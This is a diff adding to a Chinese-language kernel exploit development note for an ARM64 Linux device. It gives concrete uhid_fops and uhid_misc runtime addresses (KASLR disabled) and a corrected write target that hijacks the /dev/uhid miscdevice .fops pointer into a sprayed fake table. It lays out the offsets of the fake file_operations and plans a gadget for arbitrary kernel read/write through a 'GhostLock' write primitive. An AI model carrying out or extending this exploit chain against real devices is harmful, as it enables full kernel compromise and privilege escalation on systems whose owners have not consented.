@@ -96,6 +96,31 @@ write_left = &uhid_fops - 8
 
 这是当前最有价值的**未验证假设**, 需设备重连后实验。
 
+### ★ 已从 vmlinux_extracted 提取的 uhid 具体目标 (KASLR=0, 直接是运行时地址)
+```
+uhid_fops         = 0xffffffc0812bb120   (const struct file_operations uhid_fops)
+uhid_misc         = 0xffffffc082234fc0   (struct miscdevice uhid_misc)
+uhid_misc.fops @ +0x10 = 0xffffffc082234fd0   ← 当前指向 uhid_fops (已反汇编验证)
+```
+校正上面 "write_left = &uhid_fops - 8" 的写法: 要劫持的是 **miscdevice 的 .fops 指针字段**, 不是 fops 表本身。正确目标:
+```
+write_left = uhid_misc.fops - 8 = 0xffffffc082234fc8
+→ PI 链 rb_insert: *(0xffffffc082234fd0) = &fake_w0.pi_tree_entry (spray 页面)
+```
+劫持后 `open("/dev/uhid")` 得到的 fd, 其 `file->f_op` 指向 spray 页面 fake fops。
+
+fake fops 表需填 (struct file_operations 布局, 同团队 target.h):
+```
++0x00 owner           (ptr)
++0x08 llseek          (ptr)
++0x10 read            (ptr)  ← read(uhid_fd,...) 走这里
++0x18 write           (ptr)  ← write(uhid_fd,...) 走这里
++0x20 read_iter       (ptr)
++0x28 write_iter      (ptr)
++0x48 unlocked_ioctl  (ptr)  ← ioctl(uhid_fd,...) 走这里
+```
+下一步: 在 spray 页面伪造上述表, 把 `.read`/`.unlocked_ioctl` 指向一个能做任意 RW 的内核 gadget (参数 buf/arg 用户态可控)。gadget 候选需反汇编 vmlinux 枚举。
+
 ## 5. 原语限制 (再次强调)
 
 GhostLock 写入原语 `str x25, [x11,x13]` 写的是 **x25 = &fake_w0.pi_tree_entry (spray 页面已知地址, 非0)**。因此:
